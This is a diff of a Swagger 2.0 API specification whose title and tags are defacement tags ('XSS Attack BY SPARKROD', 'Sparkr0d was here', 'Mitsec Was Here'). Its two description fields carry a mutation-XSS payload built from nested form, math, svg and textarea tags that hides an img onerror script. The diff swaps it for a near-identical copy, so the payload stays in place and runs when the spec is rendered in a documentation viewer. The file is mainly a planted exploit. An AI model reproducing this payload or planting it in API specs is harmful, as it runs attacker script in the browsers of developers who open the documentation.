@@ -1,8 +1,8 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY SPARKROD
+  title: Sparkr0d was here
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('You been hacked!') src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('You been Hacked!') src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -20,14 +20,14 @@ paths:
         '200':
           description: No response was specified
       tags:
-        - sparkr0d_XSS_D
+        - Mitsec Was Here
       operationId: findAccounts
       summary: Finds all accounts
   '/hack/hachid/{id}':
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('You been hacked!') src=1>"></form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert('You been Hacked!') src=1>"></form>
           format: int64
           in: path
           name: id
